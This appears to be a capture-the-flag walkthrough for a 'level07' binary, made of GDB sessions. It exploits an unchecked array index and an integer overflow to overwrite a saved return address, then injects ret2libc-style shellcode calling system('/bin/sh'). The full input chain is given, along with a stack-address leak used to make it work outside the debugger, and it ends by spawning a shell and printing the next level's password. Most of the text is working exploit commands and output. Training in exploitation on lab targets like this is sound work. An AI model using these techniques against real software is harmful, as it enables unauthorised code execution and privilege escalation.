# When working with indexes, wil is not checking if the index < 0 nor > 100, it means that
# We can write whatever we want (number) wherever we want (storage+index*4)
# The idea is to store our shellcode in the storage then write (by finding the good index)
# The good index to overwrite the return value of store_number();

# Let's find where store_number is returning:
=> 0x80486d6 <store_number+166>:	ret
(gdb) x/x $esp
0xffffd51c:	0x080488ef <-- We must find this address in the stack, this is where store_number will return

(gdb) b *0x080486d5
(gdb) r < <(python -c 'print "store"' ; python -c 'print "2812782503"' ; python -c 'print "-2147483669"' ; python -c 'print "quit"')
Breakpoint 1, 0x080486d5 in store_number ()

(gdb) x/100wx $esp
0xffffd4f0:	0x08048add	0xffffd544	0x00000000	0xf7e2b6c0
0xffffd500:	0xffffd708	0xf7ff0a50	0xa7a7a7a7	0x80000020
0xffffd510:	0x00000000	0xffffdfdc	0xffffd708	0x080488ef <- HERE, WE MUST OVERWRITE HERE
0xffffd520:	0xffffd544	0x00000014	0xf7fcfac0	0xf7fdc714

# After some tries to find the right value to put in index, we got this
                                                          0xa7a7a7a7
(gdb) r < <(python -c 'print "store"' ; python -c 'print "2812782503"' ; python -c 'print "-2147483658"' ; python -c 'print "quit"')

(gdb) x/100wx $esp
0xffffd4f0:	0x08048add	0xffffd544	0x00000000	0xf7e2b6c0
0xffffd500:	0xffffd708	0xf7ff0a50	0xa7a7a7a7	0x7ffffff6
0xffffd510:	0x00000000	0xffffdfdc	0xffffd708	0xa7a7a7a7 <- VALUE HAS CHANGED
0xffffd520:	0xffffd544	0x00000014	0xf7fcfac0	0xf7fdc714
(gdb) si
0x080486d6 in store_number ()
(gdb) si
0xa7a7a7a7 in ?? () # Nice, we can control EIP now :)

=================================================================================================

# Let's build a RET2LIBC shellcode

(gdb) info func system
0xf7e6aed0  system

(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec

=========ALL===========

0:  68 ec 97 f8 f7          push   0xf7f897ec # Push /bin/sh twice, we dont care about EIP once system has ended
5:  68 ec 97 f8 f7          push   0xf7f897ec
a:  68 d0 ae e6 f7          push   0xf7e6aed0
f:  c3                      ret

# Let's translate the shellcode to decimal by group of 4
68 ec 97 f8 = f8 97 ec 68 = 4170706024
f7 68 ec 97 = 97 ec 68 f7 = 2548852983
f8 f7 68 d0 = d0 68 f7 f8 = 3496540152
ae e6 f7 c3 = c3 f7 e6 ae = 3287803566

=====FINAL======

# To write at index 0 and 3 we must use a int overflow (negative value) so we don't enter in the condition %3

(gdb) r < <(python -c 'print "store"' ; python -c 'print "4170706024"' ; python -c 'print "-2147483648"' ; python -c 'print "store"' ; python -c 'print "2548852983"' ; python -c 'print "1"' ; python -c 'print "store"' ; python -c 'print "3496540152"' ; python -c 'print "2"' ; python -c 'print "store"' ; python -c 'print "3287803558"' ; python -c 'print "-2147483645"'  ; python -c 'print "quit"')
(gdb) x/4i 0xffffd544 # 4294956356
   0xffffd544:	push   $0xf7f897ec
   0xffffd549:	push   $0xf7f897ec
   0xffffd54e:	push   $0xf7e6a6d0
   0xffffd553:	ret

# Unfortunately the exploit is working in GDB but not in the real env
# If a change env variables, my shellcode won't be at the same address so our jump will be false

=================================================================================================

# We must find the address of our storage in the real env so we will be able to redirect the execution to our shellcode at the right address
# Fortunately we can use the read function of will's storage :)

# -9 is the index where we get the argument of read (storage) so we are able to get the address of storage !
Input command: read
 Index: -9
 Number at data[4294967287] is 4294956388
 Completed read command successfully

➜  override git:(master) ✗ printf "0x%x\n" 4294956388
0xffffd564

# This is where we have to redirect EIP (0xffffd564) !
# Our shellcode is at storage[0] storage[1] storage[2] storage[3], so storage points to the beginning of our shellcode

(python -c 'print "store"' ; python -c 'print "4170706024"' ; python -c 'print "-2147483648"' ; python -c 'print "store"' ; python -c 'print "2548852983"' ; python -c 'print "1"' ; python -c 'print "store"' ; python -c 'print "3496540152"' ; python -c 'print "2"' ; python -c 'print "store"' ; python -c 'print "3287803566"' ; python -c 'print "-2147483645"' ; python -c 'print "store"' ; python -c 'print "2967570771"' ; python -c 'print "4"' ; python -c 'print "store"' ; python -c 'print "8441099"' ; python -c 'print "5"' ; python -c 'print "store"' ; python -c 'print "4294956388"' ; python -c 'print "-2147483658"' ; cat) | ./level07
Input command:  Number:  Index: whoami
level08
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
